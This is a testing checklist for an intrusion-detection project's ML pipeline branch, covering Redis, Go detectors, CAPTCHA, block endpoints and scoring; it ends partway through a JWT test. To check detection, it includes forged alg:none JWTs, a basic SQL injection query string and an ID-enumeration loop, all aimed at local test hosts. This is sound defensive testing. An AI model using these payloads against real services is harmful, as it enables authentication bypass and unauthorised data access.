# ML Pipeline Integration — Testing Documentation & Checklist

**Branch:** `suraj/ml-pipeline-phase-a-to-d`  
**Date:** 2026-08-29  
**Author:** Suraj / Antigravity Agent  
**Scope:** All components implemented in Phases A–D of the ML planning master plan

> **How to use this document**  
> Work through each section in order. Mark each item `[x]` when it passes.  
> Record the actual command output or screenshot reference in the _Notes_ column.  
> A test suite is **PASS** only when every item in it is checked.

---

## Table of Contents

1. [Pre-flight Checks](#1-pre-flight-checks)
2. [Phase A — Redis Security Client](#2-phase-a--redis-security-client)
3. [Phase B — Go Detection Engine (28 New Categories + JWT Analyzer + BOLA)](#3-phase-b--go-detection-engine)
4. [Phase C — CAPTCHA Gate Middleware](#4-phase-c--captcha-gate-middleware)
5. [Dashboard — BlockedEntity Block/Unblock Pipeline](#5-dashboard--blockedentity-blockupblock-pipeline)
6. [ML Directory — Python Feature Encoder](#6-ml-directory--python-feature-encoder)
7. [ML Scoring Service (FastAPI)](#7-ml-scoring-service-fastapi)
8. [Sandbox — Attack Traffic Generation](#8-sandbox--attack-traffic-generation)
9. [End-to-End Integration Smoke Test](#9-end-to-end-integration-smoke-test)
10. [Regression — Existing Functionality Not Broken](#10-regression--existing-functionality-not-broken)
11. [Test Summary Sheet](#11-test-summary-sheet)

---

## 1. Pre-flight Checks

> Run these once before any other section. Nothing else is valid until all pass.

### 1.1 Repository & Build

| # | Test | Command | Expected Result | Pass? | Notes |
|---|---|---|---|---|---|
| 1.1.1 | Correct branch | `git branch --show-current` | `suraj/ml-pipeline-phase-a-to-d` | `[ ]` | |
| 1.1.2 | No uncommitted changes | `git status` | `nothing to commit, working tree clean` | `[ ]` | |
| 1.1.3 | Go compilation clean | `cd Security && go build ./...` | Exit 0, no errors | `[ ]` | |
| 1.1.4 | Go vet clean | `cd Security && go vet ./...` | Exit 0, no warnings | `[ ]` | |
| 1.1.5 | Backend deps installed | `cd Web/backend && npm install` | Exit 0 | `[ ]` | |
| 1.1.6 | Backend loads without error | `cd Web/backend && node -e "require('./src/server')"` (Ctrl-C after 2s) | No `MODULE_NOT_FOUND` errors | `[ ]` | Redis/Mongo connection errors are OK at this stage |
| 1.1.7 | Python deps available | `cd ML && pip install -r requirements.txt` | All packages installed | `[ ]` | |

### 1.2 Required Services Running

| # | Service | Start Command | Health Check | Pass? |
|---|---|---|---|---|
| 1.2.1 | Redis | `redis-server &` | `redis-cli ping` → `PONG` | `[ ]` |
| 1.2.2 | MongoDB | `mongod --fork --logpath /tmp/mongod.log` | `mongosh --eval "db.runCommand({ping:1})"` → `{ ok: 1 }` | `[ ]` |
| 1.2.3 | Go proxy binary | `cd Security && make all` | `./ngfw-monitor --help` exits 0 | `[ ]` |
| 1.2.4 | Backend API | `cd Web/backend && npm run dev` | `curl http://localhost:5000/` → `{"status":"ok"}` | `[ ]` |

---

## 2. Phase A — Redis Security Client

**File under test:** [`Web/backend/src/services/redisSecurityClient.js`](file:///home/kali/Desktop/Next-Gen-IDS-IPS-with-MLOPs/Web/backend/src/services/redisSecurityClient.js)

### 2.1 Module Load

```bash
cd Web/backend
node -e "const r = require('./src/services/redisSecurityClient'); console.log(Object.keys(r));"
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 2.1.1 | Module loads without crash | No exception thrown | `[ ]` |
| 2.1.2 | All exports present | Output includes: `repClient, rollClient, gateClient, getReputation, isKnownBadFeedIp, cacheBlock, clearBlockCache, isBlockedCache, bumpRequestRate, setChallengeState, getChallengeState` | `[ ]` |

### 2.2 DB Isolation — Three Separate Connections

```bash
node -e "
const { repClient, rollClient, gateClient } = require('./src/services/redisSecurityClient');
console.log('repClient db:', repClient.options.db);
console.log('rollClient db:', rollClient.options.db);
console.log('gateClient db:', gateClient.options.db);
"
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 2.2.1 | `repClient` uses DB 0 | `repClient db: 0` | `[ ]` |
| 2.2.2 | `rollClient` uses DB 1 | `rollClient db: 1` | `[ ]` |
| 2.2.3 | `gateClient` uses DB 2 | `gateClient db: 2` | `[ ]` |

### 2.3 Reputation Lookup

```bash
node -e "
const { getReputation } = require('./src/services/redisSecurityClient');
getReputation('203.0.113.1').then(r => { console.log(JSON.stringify(r)); process.exit(0); });
"
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 2.3.1 | Returns result for unknown IP | `{"ip":"203.0.113.1","score":0,"knownBad":false,"found":false}` | `[ ]` |
| 2.3.2 | `knownBad` is `false` for score < 80 | score 0 → knownBad false | `[ ]` |

### 2.4 Block Cache Round-Trip

```bash
node -e "
const { cacheBlock, isBlockedCache, clearBlockCache } = require('./src/services/redisSecurityClient');
const ip = '10.0.0.99';
cacheBlock(ip, 60)
  .then(() => isBlockedCache(ip))
  .then(blocked => { console.log('blocked:', blocked); return clearBlockCache(ip); })
  .then(() => isBlockedCache(ip))
  .then(blocked => { console.log('after clear:', blocked); process.exit(0); });
"
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 2.4.1 | IP is blocked after `cacheBlock()` | `blocked: true` | `[ ]` |
| 2.4.2 | IP is unblocked after `clearBlockCache()` | `after clear: false` | `[ ]` |
| 2.4.3 | TTL stored (verify in redis-cli) | `redis-cli -n 2 TTL gate:blocked:10.0.0.99` returns a positive integer ≤ 60 | `[ ]` |

### 2.5 Request Rate Bumping

```bash
node -e "
const { bumpRequestRate } = require('./src/services/redisSecurityClient');
const run = async () => {
  for (let i = 1; i <= 8; i++) {
    const c = await bumpRequestRate('test-ep:127.0.0.1', 10);
    console.log('count:', c);
  }
  process.exit(0);
};
run();
"
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 2.5.1 | Counter increments correctly | `count: 1` through `count: 8` (monotonic) | `[ ]` |
| 2.5.2 | Key has TTL | `redis-cli -n 2 TTL gate:reqrate:test-ep:127.0.0.1` → positive integer ≤ 10 | `[ ]` |

### 2.6 Fail-Open Behaviour (Redis Down)

```bash
redis-cli SHUTDOWN NOSAVE   # stop Redis temporarily
node -e "
const { getReputation } = require('./src/services/redisSecurityClient');
getReputation('1.2.3.4').catch(e => console.log('crashed:', e.message));
setTimeout(() => { console.log('process still alive'); process.exit(0); }, 3000);
"
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 2.6.1 | Process does NOT crash | `process still alive` printed, no uncaught exception | `[ ]` |
| 2.6.2 | Error logged to stderr (not thrown) | `[redisSecurityClient][db=X] error:` visible | `[ ]` |

> Restart Redis before continuing: `redis-server &`

---

## 3. Phase B — Go Detection Engine

### 3.1 Compilation & Category Constants

```bash
cd Security && go build ./...
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 3.1.1 | Clean build | Exit 0, no errors | `[ ]` |
| 3.1.2 | All 28 new constants exist | `grep -c 'Cat' detect/detection.go` → ≥ 49 (original) + 28 = ≥ 77 | `[ ]` |

Verify specific high-value constants:

```bash
grep -E "CatBOLA|CatJWTAlgNone|CatJWTAlgConfusion|CatJWTExpiredAccepted|CatLFI|CatCSRF|CatSSTI|CatNoSQLi|CatRDPExploit|CatDNSSpoofing" Security/detect/detection.go
```

| # | Constant | Expected String Value | Pass? |
|---|---|---|---|
| 3.1.3 | `CatBOLA` | `"bola"` | `[ ]` |
| 3.1.4 | `CatJWTAlgNone` | `"jwt-alg-none"` | `[ ]` |
| 3.1.5 | `CatJWTAlgConfusion` | `"jwt-alg-confusion"` | `[ ]` |
| 3.1.6 | `CatJWTExpiredAccepted` | `"jwt-expired-accepted"` | `[ ]` |
| 3.1.7 | `CatLFI` | `"lfi"` | `[ ]` |
| 3.1.8 | `CatCSRF` | `"csrf"` | `[ ]` |
| 3.1.9 | `CatSSTI` | `"ssti"` | `[ ]` |
| 3.1.10 | `CatNoSQLi` | `"nosqli"` | `[ ]` |
| 3.1.11 | `CatRDPExploit` | `"rdp-exploit"` | `[ ]` |
| 3.1.12 | `CatDNSSpoofing` | `"dns-spoofing"` | `[ ]` |

### 3.2 JWT Analyzer — Unit Tests

Write a temporary test file and run it:

```bash
cat > /tmp/jwt_test.go << 'EOF'
package main

import (
    "encoding/base64"
    "encoding/json"
    "fmt"
    "strings"
    "time"
)

func b64(s string) string { return base64.RawURLEncoding.EncodeToString([]byte(s)) }

func makeToken(header, payload map[string]any) string {
    hJSON, _ := json.Marshal(header)
    pJSON, _ := json.Marshal(payload)
    return b64(string(hJSON)) + "." + b64(string(pJSON)) + ".fakesig"
}

func main() {
    // Case 1: alg:none
    t1 := makeToken(map[string]any{"alg": "none", "typ": "JWT"},
                    map[string]any{"sub": "1", "exp": time.Now().Add(1*time.Hour).Unix()})
    fmt.Println("alg:none token:", t1[:40]+"…")

    // Case 2: alg:HS256 (confusion)
    t2 := makeToken(map[string]any{"alg": "HS256", "typ": "JWT"},
                    map[string]any{"sub": "2", "exp": time.Now().Add(1*time.Hour).Unix()})
    fmt.Println("hs256 token:", t2[:40]+"…")

    // Case 3: expired token
    t3 := makeToken(map[string]any{"alg": "RS256", "typ": "JWT"},
                    map[string]any{"sub": "3", "exp": time.Now().Add(-1*time.Hour).Unix()})
    fmt.Println("expired token:", t3[:40]+"…")

    // Case 4: malformed (only 2 parts)
    t4 := b64(`{"alg":"RS256"}`) + ".onlytwoparts"
    fmt.Println("malformed token:", t4[:30]+"…")

    // Case 5: not a bearer token
    t5 := "Basic dXNlcjpwYXNz"
    fmt.Println("basic auth (should skip):", t5)

    _ = strings.TrimSpace // just to use strings pkg
}
EOF
go run /tmp/jwt_test.go
```

Use the printed tokens as `Authorization: Bearer <token>` in the curl tests below (with the proxy running):

| # | JWT Scenario | Expected Detection ID | Severity | Pass? | Notes |
|---|---|---|---|---|---|
| 3.2.1 | `alg:none` token | `JWT-ALG-NONE-001` | CRITICAL | `[ ]` | Check proxy/dashboard logs |
| 3.2.2 | `HS256` symmetric algo | `JWT-ALG-CONF-001` | LOW | `[ ]` | |
| 3.2.3 | Expired token (`exp` in past) | `JWT-EXPIRED-001` | MEDIUM | `[ ]` | |
| 3.2.4 | Malformed token (2 parts) | `JWT-MALFORMED-001` | MEDIUM | `[ ]` | |
| 3.2.5 | `Basic` auth header | No detection fired | — | `[ ]` | Non-Bearer headers are skipped |
| 3.2.6 | Valid RS256 token (exp in future) | No detection fired | — | `[ ]` | |

**Manual curl tests (proxy must be running on `$PROXY_HOST:$PROXY_PORT`):**

```bash
# 3.2.1 — alg:none bypass
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer <alg_none_token_from_step_above>" \
  http://$PROXY_HOST:$PROXY_PORT/api/test

# 3.2.3 — expired token
curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer <expired_token_from_step_above>" \
  http://$PROXY_HOST:$PROXY_PORT/api/test
```

> ✎ _Record observed Detection events from dashboard or Go stdout here:_

### 3.3 BOLA / ID-Enumeration Tracker

**Threshold:** 20 distinct IDs in 5 minutes → `BOLA-ENUM-001` fires.

```bash
# Send 25 requests to /api/orders/{1..25} through the proxy
for i in $(seq 1 25); do
  curl -s -o /dev/null http://$PROXY_HOST:$PROXY_PORT/api/orders/$i
  sleep 0.1
done
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 3.3.1 | No detection before 20th request | Requests 1–19: no BOLA-ENUM-001 in logs | `[ ]` |
| 3.3.2 | Detection fires at ≥ 20 distinct IDs | `BOLA-ENUM-001` appears after 20th unique ID | `[ ]` |
| 3.3.3 | Detection has correct fields | `Category: "bola"`, `Severity: SevHigh`, `distinct_ids ≥ 20` | `[ ]` |
| 3.3.4 | Repeating the same ID does NOT inflate count | Send `/api/orders/1` 50×, no BOLA fires | `[ ]` |
| 3.3.5 | Non-parameterised URIs are ignored | Send `/api/health` 50×, no BOLA fires | `[ ]` |

### 3.4 New Category Constants — Acceptance

```bash
# Verify the 5 protocol group categories compile into the binary
cd Security && go build -v ./... 2>&1 | head -5
echo "checking for specific categories..."
grep -c "Cat" detect/detection.go
```

| # | Protocol Group | Count Added | Pass? |
|---|---|---|---|
| 3.4.1 | HTTP/API | 18 new constants | `[ ]` |
| 3.4.2 | SSH | 2 new constants | `[ ]` |
| 3.4.3 | DNS | 2 new constants | `[ ]` |
| 3.4.4 | FTP | 1 new constant | `[ ]` |
| 3.4.5 | SMTP | 1 new constant | `[ ]` |
| 3.4.6 | TLS | 1 new constant | `[ ]` |
| 3.4.7 | Generic (RDP/UDP/SNMP) | 3 new constants | `[ ]` |

---

## 4. Phase C — CAPTCHA Gate Middleware

**Files under test:**
- [`Web/backend/src/middleware/captcha.middleware.js`](file:///home/kali/Desktop/Next-Gen-IDS-IPS-with-MLOPs/Web/backend/src/middleware/captcha.middleware.js)
- [`Web/frontend/src/components/CaptchaGate.jsx`](file:///home/kali/Desktop/Next-Gen-IDS-IPS-with-MLOPs/Web/frontend/src/components/CaptchaGate.jsx)

### 4.1 Module Load

```bash
cd Web/backend
node -e "
const m = require('./src/middleware/captcha.middleware');
console.log(typeof m.requireCaptchaIfSuspicious, typeof m.verifyCaptchaToken);
"
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 4.1.1 | Module loads | No exception | `[ ]` |
| 4.1.2 | Both exports are functions | `function function` | `[ ]` |

### 4.2 Rate Threshold — Normal Traffic (< 7 requests in 10s)

Add the middleware to a test route temporarily and hit it 5 times:

```bash
# Start backend, then:
for i in $(seq 1 5); do
  curl -s -w "\n%{http_code}" http://localhost:5000/api/auth/login \
    -X POST -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"test"}'; echo
done
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 4.2.1 | First 6 requests pass through (no 403) | HTTP 200 or 401 (auth error), NOT 403 | `[ ]` |

### 4.3 Rate Threshold — Suspicious Traffic (> 6 requests in 10s)

```bash
for i in $(seq 1 10); do
  curl -s -w "%{http_code}\n" http://localhost:5000/api/auth/login \
    -X POST -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"test"}'
done
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 4.3.1 | 7th+ request returns 403 | HTTP 403 with `captcha_required: true` | `[ ]` |
| 4.3.2 | Response body has required fields | `{ captcha_required: true, sitekey: "...", message: "..." }` | `[ ]` |
| 4.3.3 | `sitekey` is the env var value | Matches `TURNSTILE_SITE_KEY` from `.env` | `[ ]` |

### 4.4 Fail-Open Behaviour (Redis Down)

```bash
redis-cli SHUTDOWN NOSAVE
# Immediately run the rate check request
curl -s -w "%{http_code}" http://localhost:5000/api/auth/login \
  -X POST -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test"}'
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 4.4.1 | Request passes through even with Redis down | HTTP 200 or 401, NOT 403 | `[ ]` |
| 4.4.2 | Error logged to stdout | `[captcha.middleware] error, failing open:` visible | `[ ]` |

> Restart Redis before continuing.

### 4.5 CaptchaGate.jsx — Component Structure

```bash
cat Web/frontend/src/components/CaptchaGate.jsx | grep -E "export default|useRef|useEffect|turnstile.render|captcha-gate"
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 4.5.1 | Default export exists | `export default function CaptchaGate` | `[ ]` |
| 4.5.2 | Uses `useRef` and `useEffect` | Both present | `[ ]` |
| 4.5.3 | Calls `window.turnstile.render` | Present in `useEffect` | `[ ]` |
| 4.5.4 | Cleanup removes widget on unmount | `window.turnstile.remove(widgetIdRef.current)` in return | `[ ]` |
| 4.5.5 | CSS class applied | `className="captcha-gate"` | `[ ]` |

---

## 5. Dashboard — BlockedEntity Block/Unblock Pipeline

**Files under test:**
- [`Web/backend/src/models/BlockedEntity.js`](file:///home/kali/Desktop/Next-Gen-IDS-IPS-with-MLOPs/Web/backend/src/models/BlockedEntity.js)
- [`Web/backend/src/controllers/block.controller.js`](file:///home/kali/Desktop/Next-Gen-IDS-IPS-with-MLOPs/Web/backend/src/controllers/block.controller.js)
- [`Web/backend/src/routes/block.routes.js`](file:///home/kali/Desktop/Next-Gen-IDS-IPS-with-MLOPs/Web/backend/src/routes/block.routes.js)
- [`Web/backend/src/server.js`](file:///home/kali/Desktop/Next-Gen-IDS-IPS-with-MLOPs/Web/backend/src/server.js) (route registration)
- [`Web/backend/src/models/AdminThreshold.js`](file:///home/kali/Desktop/Next-Gen-IDS-IPS-with-MLOPs/Web/backend/src/models/AdminThreshold.js)

> **Prerequisite:** Backend running with MongoDB connected. Obtain a valid JWT auth token first:
> ```bash
> TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
>   -H "Content-Type: application/json" \
>   -d '{"email":"admin@admin.com","password":"admin123"}' | python3 -m json.tool | grep '"token"' | awk -F'"' '{print $4}')
> echo "Token: $TOKEN"
> ```

### 5.1 Route Registration

```bash
grep "admin/blocked" Web/backend/src/server.js
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 5.1.1 | Route is registered | `app.use('/api/admin/blocked', require('./routes/block.routes'))` | `[ ]` |

### 5.2 GET /api/admin/blocked — List

```bash
curl -s http://localhost:5000/api/admin/blocked \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 5.2.1 | Endpoint reachable | HTTP 200 (not 404) | `[ ]` |
| 5.2.2 | Returns array | `[]` or array of objects | `[ ]` |
| 5.2.3 | Status filter works | `?status=active` returns only active records | `[ ]` |
| 5.2.4 | Mode filter works | `?mode=manual` returns only manual records | `[ ]` |

### 5.3 POST /api/admin/blocked — Create Manual Block

```bash
curl -s -X POST http://localhost:5000/api/admin/blocked \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "targetType": "ip",
    "targetValue": "10.10.10.99",
    "reason": "Test manual block from test suite",
    "protocol": "HTTP",
    "action": "block"
  }' | python3 -m json.tool
```

Save the returned `_id` as `$BLOCK_ID` for the unblock test.

| # | Check | Expected | Pass? |
|---|---|---|---|
| 5.3.1 | HTTP 201 returned | `201 Created` | `[ ]` |
| 5.3.2 | `status` is `"active"` | `"status": "active"` | `[ ]` |
| 5.3.3 | `mode` is `"manual"` | `"mode": "manual"` | `[ ]` |
| 5.3.4 | `targetValue` is correct IP | `"targetValue": "10.10.10.99"` | `[ ]` |
| 5.3.5 | Redis block cache set | `redis-cli -n 2 EXISTS gate:blocked:10.10.10.99` → `1` | `[ ]` |
| 5.3.6 | Record appears in GET list | `curl .../api/admin/blocked?status=active` includes the new entry | `[ ]` |
| 5.3.7 | Missing required field returns 400 | POST with no `targetValue` → HTTP 400 | `[ ]` |

### 5.4 PATCH /api/admin/blocked/:id/unblock

```bash
curl -s -X PATCH http://localhost:5000/api/admin/blocked/$BLOCK_ID/unblock \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{}' | python3 -m json.tool
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 5.4.1 | HTTP 200 returned | `200 OK` | `[ ]` |
| 5.4.2 | `status` changes to `"unblocked"` | `"status": "unblocked"` | `[ ]` |
| 5.4.3 | `unblockedAt` is set | Non-null `unblockedAt` timestamp | `[ ]` |
| 5.4.4 | Redis block cache cleared | `redis-cli -n 2 EXISTS gate:blocked:10.10.10.99` → `0` | `[ ]` |
| 5.4.5 | Unblocking again returns 400 | Second PATCH returns `{ message: "Already unblocked" }` | `[ ]` |
| 5.4.6 | Unknown ID returns 404 | PATCH with invalid ObjectId → HTTP 404 | `[ ]` |

### 5.5 Unauthenticated Access Blocked

```bash
curl -s -w "%{http_code}" http://localhost:5000/api/admin/blocked
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 5.5.1 | Unauthenticated GET returns 401 | HTTP 401 | `[ ]` |
| 5.5.2 | Unauthenticated POST returns 401 | HTTP 401 | `[ ]` |

### 5.6 AdminThreshold — Auto-Block Fields

```bash
cd Web/backend
node -e "
const AT = require('./src/models/AdminThreshold');
const schema = AT.schema.obj;
console.log('autoBlockEnabled default:', schema.autoBlockEnabled.default);
console.log('autoBlockThreshold default:', schema.autoBlockThreshold.default);
console.log('autoAlertThreshold default:', schema.autoAlertThreshold.default);
"
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 5.6.1 | `autoBlockEnabled` default is `true` | `true` | `[ ]` |
| 5.6.2 | `autoBlockThreshold` default is `85` | `85` | `[ ]` |
| 5.6.3 | `autoAlertThreshold` default is `60` | `60` | `[ ]` |
| 5.6.4 | Original `feature` / `config` fields still exist | No missing field errors in node eval | `[ ]` |

---

## 6. ML Directory — Python Feature Encoder

**File under test:** [`ML/feature_encoder.py`](file:///home/kali/Desktop/Next-Gen-IDS-IPS-with-MLOPs/ML/feature_encoder.py)

### 6.1 Smoke Test

```bash
cd ML
python feature_encoder.py
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 6.1.1 | Script exits 0 | No traceback | `[ ]` |
| 6.1.2 | Column check passes | `Flattened columns check: True` | `[ ]` |
| 6.1.3 | DataFrame printed | 1 row × 23 columns table visible | `[ ]` |

### 6.2 Column Count Verification

```bash
python3 -c "
from feature_encoder import HTTP_FEATURE_COLUMNS, FLOW_FEATURE_COLUMNS, SSH_FEATURE_COLUMNS, DNS_FEATURE_COLUMNS
print('HTTP columns:', len(HTTP_FEATURE_COLUMNS))
print('Flow columns:', len(FLOW_FEATURE_COLUMNS))
print('SSH columns:', len(SSH_FEATURE_COLUMNS))
print('DNS columns:', len(DNS_FEATURE_COLUMNS))
"
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 6.2.1 | HTTP feature columns | `23` | `[ ]` |
| 6.2.2 | Flow feature columns | `36` | `[ ]` |
| 6.2.3 | SSH feature columns | `10` | `[ ]` |
| 6.2.4 | DNS feature columns | `10` | `[ ]` |

### 6.3 Missing Fields — Default to Zero (No NaN)

```bash
python3 -c "
from feature_encoder import load_http_payload_features, HTTP_FEATURE_COLUMNS
import pandas as pd, io, json

# minimal record with most fields missing
line = json.dumps({'conn_id':'c1','source_ip':'1.2.3.4'})
import tempfile, os
with tempfile.NamedTemporaryFile(mode='w',suffix='.jsonl',delete=False) as f:
    f.write(line+'\n'); fname=f.name

df = load_http_payload_features(fname)
print('NaN count:', df[HTTP_FEATURE_COLUMNS].isna().sum().sum())
print('Shape:', df.shape)
os.unlink(fname)
"
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 6.3.1 | No NaN values in feature columns | `NaN count: 0` | `[ ]` |
| 6.3.2 | Shape has all 23 numeric columns | `(1, 23+)` | `[ ]` |

### 6.4 `encode_single_http_payload` Returns Correct Shape

```bash
python3 -c "
from feature_encoder import encode_single_http_payload, HTTP_FEATURE_COLUMNS
import numpy as np
X = encode_single_http_payload({}, {})
print('Shape:', X.shape)
print('dtype:', X.dtype)
assert X.shape == (1, len(HTTP_FEATURE_COLUMNS)), 'FAIL: wrong shape'
print('PASS')
"
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 6.4.1 | Returns 2D array `(1, 23)` | `Shape: (1, 23)` | `[ ]` |
| 6.4.2 | dtype is float | `float64` | `[ ]` |
| 6.4.3 | Assertion passes | `PASS` | `[ ]` |

---

## 7. ML Scoring Service (FastAPI)

**File under test:** [`ML/scoring_service.py`](file:///home/kali/Desktop/Next-Gen-IDS-IPS-with-MLOPs/ML/scoring_service.py)

> **Note:** Models are not yet trained (Phase E pending). The scoring service starts and responds with `model_version: "not_loaded"` when models are absent — this is correct behaviour.

### 7.1 Service Starts

```bash
cd ML
uvicorn scoring_service:app --host 0.0.0.0 --port 8500 &
sleep 3
curl -s http://localhost:8500/health | python3 -m json.tool
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 7.1.1 | Service starts without crash | Process running, no traceback | `[ ]` |
| 7.1.2 | `/health` returns 200 | HTTP 200 | `[ ]` |
| 7.1.3 | Response has `status` field | `"status": "ok"` or `"degraded"` | `[ ]` |
| 7.1.4 | Model versions listed | `models` object present (may be empty if not trained) | `[ ]` |

### 7.2 Scoring Endpoints — Schema Validation

```bash
# POST /score/http-payload with empty payload (models not loaded → risk_score=0)
curl -s -X POST http://localhost:8500/score/http-payload \
  -H "Content-Type: application/json" \
  -d '{"payload_stats": {}, "request": {}}' | python3 -m json.tool
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 7.2.1 | Endpoint accepts empty payload | HTTP 200 (not 422/500) | `[ ]` |
| 7.2.2 | `risk_score` present in response | `0.0` (no model loaded) | `[ ]` |
| 7.2.3 | `model_version` field present | Any string | `[ ]` |

```bash
# POST /score/flow
curl -s -X POST http://localhost:8500/score/flow \
  -H "Content-Type: application/json" \
  -d '{"flow_record": {}}' | python3 -m json.tool
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 7.2.4 | `/score/flow` accepts empty record | HTTP 200 | `[ ]` |

```bash
# GET /reputation/{ip}
curl -s http://localhost:8500/reputation/10.0.0.1 | python3 -m json.tool
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 7.2.5 | `/reputation/{ip}` responds | HTTP 200 | `[ ]` |
| 7.2.6 | Returns score field | `"score": 0` (no data yet) | `[ ]` |

### 7.3 Fail-Open — 50ms Timeout Simulation

```bash
# Simulate Go proxy's timeout constraint
curl -s --max-time 0.05 -X POST http://localhost:8500/score/http-payload \
  -H "Content-Type: application/json" \
  -d '{"payload_stats": {}, "request": {}}' -w "\nHTTP: %{http_code}\n"
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 7.3.1 | Service responds within 50ms when no model is loaded | HTTP 200 within 50ms | `[ ]` |

> Kill the scoring service before continuing: `pkill -f uvicorn`

---

## 8. Sandbox — Attack Traffic Generation

**Files under test:**
- [`sandbox/docker-compose.sandbox.yml`](file:///home/kali/Desktop/Next-Gen-IDS-IPS-with-MLOPs/sandbox/docker-compose.sandbox.yml)
- [`sandbox/generate_labeled_traffic.sh`](file:///home/kali/Desktop/Next-Gen-IDS-IPS-with-MLOPs/sandbox/generate_labeled_traffic.sh)

### 8.1 YAML Validity

```bash
python3 -c "import yaml; yaml.safe_load(open('sandbox/docker-compose.sandbox.yml')); print('PASS')"
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 8.1.1 | YAML parses without error | `PASS` | `[ ]` |
| 8.1.2 | `dvwa` service defined | `grep -c 'dvwa:' sandbox/docker-compose.sandbox.yml` → ≥ 1 | `[ ]` |
| 8.1.3 | `juiceshop` service defined | `grep -c 'juiceshop:' sandbox/docker-compose.sandbox.yml` → ≥ 1 | `[ ]` |
| 8.1.4 | Network is `internal: true` | `grep 'internal: true' sandbox/docker-compose.sandbox.yml` → match | `[ ]` |
| 8.1.5 | No host port mappings (security) | `grep 'ports:' sandbox/docker-compose.sandbox.yml` → empty (all commented) | `[ ]` |

### 8.2 Script Permissions and Shebang

```bash
head -1 sandbox/generate_labeled_traffic.sh
ls -la sandbox/generate_labeled_traffic.sh
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 8.2.1 | Executable bit set | `-rwxr-xr-x` permissions | `[ ]` |
| 8.2.2 | Correct shebang | `#!/usr/bin/env bash` | `[ ]` |

### 8.3 Bash Syntax Validation

```bash
bash -n sandbox/generate_labeled_traffic.sh && echo "PASS"
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 8.3.1 | Script syntax valid | `PASS` | `[ ]` |

### 8.4 Docker Compose Start (Requires Docker)

```bash
cd sandbox
docker-compose -f docker-compose.sandbox.yml up -d
sleep 10
docker-compose -f docker-compose.sandbox.yml ps
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 8.4.1 | Containers start | `Up` status for `sandbox-dvwa` and `sandbox-juiceshop` | `[ ]` |
| 8.4.2 | No containers exposed to host | `docker ps --format "table {{.Ports}}"` shows no 0.0.0.0 bindings for sandbox containers | `[ ]` |
| 8.4.3 | Containers can reach each other | `docker exec sandbox-dvwa ping -c 1 sandbox-juiceshop` → success | `[ ]` |

```bash
# Cleanup
docker-compose -f docker-compose.sandbox.yml down
```

---

## 9. End-to-End Integration Smoke Test

> **Prerequisite:** Go proxy running in Integrated Mode pointing at a local test backend, Redis running, MongoDB running, Node.js backend running.

### 9.1 Setup

```bash
# Terminal 1: Redis
redis-server

# Terminal 2: MongoDB
mongod

# Terminal 3: Node.js backend
cd Web/backend && npm run dev

# Terminal 4: ML scoring service (optional — fail-open if absent)
cd ML && uvicorn scoring_service:app --port 8500

# Terminal 5: Go proxy (point at Node backend port)
cd Security && sudo ./ngfw-monitor
# Select Option 3 (Integrated Mode), enter your interface and port
```

### 9.2 Normal Request Flow

```bash
curl -s http://$PROXY_HOST:$PROXY_PORT/ -w "\nHTTP: %{http_code}\n"
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 9.2.1 | Normal request passes through | HTTP 200 from backend | `[ ]` |
| 9.2.2 | No false-positive Detection emitted | Dashboard shows 0 threats for the clean request | `[ ]` |

### 9.3 SQLi Triggers Tier-1 Rule

```bash
curl -s "http://$PROXY_HOST:$PROXY_PORT/page?id=1'+OR+'1'='1" \
  -w "\nHTTP: %{http_code}\n"
```

| # | Check | Expected | Pass? |
|---|---|---|---|
| 9.3.1 | Request detected | `CatSQLi` Detection emitted | `[ ]` |
| 9.3.2 | Detection visible in dashboard | Threat event appears in real-time | `[ ]` |
| 9.3.3 | Source IP captured | Detection includes correct `source_ip` | `[ ]` |

### 9.4 alg:none JWT Triggers Detection

```bash
# Build alg:none token
ALG_NONE_HDR=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"sub":"attacker","exp":9999999999}' | base64 | tr -d '=' | tr '+/' '-_')
TOKEN="${ALG_NONE_HDR}.${PAYLOAD}."

curl -s "http://$PROXY_HOST:$PROXY_PORT/api/protected" \
  -H "Authorization: Bearer $TOKEN" \
  -w "\nHTTP: %{http_code}\n"
```

| # | Check | Expected | Pass? |
|---|---|---|---|
